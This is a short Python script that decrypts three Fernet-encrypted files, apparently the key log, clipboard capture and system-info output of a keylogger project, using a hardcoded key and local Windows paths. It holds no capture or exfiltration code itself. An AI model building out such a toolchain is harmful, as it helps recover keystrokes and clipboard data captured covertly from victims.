from cryptography.fernet import Fernet
import os

# The encryption key
key = "NO5RhUvsS_PCxNbA1CPCGkhdq7D1VP6MgCGihuxTE4U="

# Full paths to the encrypted files
encrypted_files = [
    "C:\\Users\\ktmdu\\PycharmProjects\\PythonProject\\.venv\\Project\\e_system_info.txt",
    "C:\\Users\\ktmdu\\PycharmProjects\\PythonProject\\.venv\\Project\\e_clipboard.txt",
    "C:\\Users\\ktmdu\\PycharmProjects\\PythonProject\\.venv\\Project\\e_key_log.txt"
]

# Decrypting files
count = 0
for decrypting_file in encrypted_files:
    try:
        with open(decrypting_file, 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        decrypted = fernet.decrypt(data)

        decrypted_file = decrypting_file.replace("e_", "")  # Removing 'e_' prefix for decrypted file names

        with open(decrypted_file, 'wb') as f:
            f.write(decrypted)

        print(f"[SUCCESS] Decrypted {decrypting_file} to {decrypted_file}")
    except Exception as e:
        print(f"[ERROR] Failed to decrypt {decrypting_file}: {e}")
